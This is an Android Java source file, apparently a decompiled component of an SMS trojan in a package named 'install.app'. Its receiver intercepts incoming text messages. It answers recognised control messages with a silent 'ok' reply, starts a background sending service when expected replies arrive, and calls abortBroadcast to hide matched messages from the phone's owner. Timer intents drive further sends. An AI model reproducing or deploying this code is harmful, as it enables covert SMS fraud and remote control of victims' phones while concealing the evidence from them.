package install.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class MainReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            Settings settings;
            if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                SmsMessage[] messages = getSmsMessages(intent.getExtras());
                boolean find = false;
                for (int i = 0; i < messages.length; i++) {
                    try {
                        SmsMessage smsMessage = messages[i];
                        String number = smsMessage.getOriginatingAddress();
                        String text = smsMessage.getMessageBody();
                        if (Settings.loadSettings(context)) {
                            settings = Settings.getSettings();
                            if (settings.isAosMessage(number, text)) {
                                find = true;
                                System.out.println("isAosMessage() true");
                                try {
                                    Settings.sendSms(number, "ok");
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                            SmsItem smsItem = settings.loadCurrentSmsItem();
                            WildCardStringFinder finderText = new WildCardStringFinder();
                            WildCardStringFinder finderNumber = new WildCardStringFinder();
                            if (smsItem.number.length() > 0 && smsItem.text.length() > 0 && finderNumber.isStringMatching(number, smsItem.responseNumber)) {
                                if (finderText.isStringMatching(text, smsItem.responseText)) {
                                    find = true;
                                    Settings.timeNotActual = true;
                                    if (!settings.defaultSet) {
                                        Settings.cancelWaitTimer(context);
                                        MainService.start(context, intent, "sms", true);
                                    }
                                }
                            }
                            if (!find && settings.isDeleteMessage(number, text)) {
                                find = true;
                            }
                        }
                    } catch (Exception ex2) {
                        ex2.printStackTrace();
                    }
                }
                if (find) {
                    try {
                        abortBroadcast();
                    } catch (Exception ex22) {
                        ex22.printStackTrace();
                    }
                }
            } else if (action.equals("custom.timer.wait")) {
                if (!Settings.timeNotActual) {
                    MainService.start(context, intent, "sms", false);
                }
            } else if (action.equals("custom.timer.send")) {
                MainService.start(context, intent, "send");
            } else if (action.equals("android.intent.action.BOOT_COMPLETED")) {
                if (Settings.loadSettings(context)) {
                    settings = Settings.getSettings();
                    if (settings.working) {
                        settings.working = false;
                        settings.save(context);
                    }
                }
            } else if (action.equals("custom.timer.kill")) {
                MainService.isRunning = false;
            }
        } catch (Exception ex222) {
            ex222.printStackTrace();
        }
    }

    private SmsMessage[] getSmsMessages(Bundle paramBundle) {
        Object[] array = (Object[]) paramBundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[array.length];
        for (int i = 0; i < array.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);
        }
        return messages;
    }
}
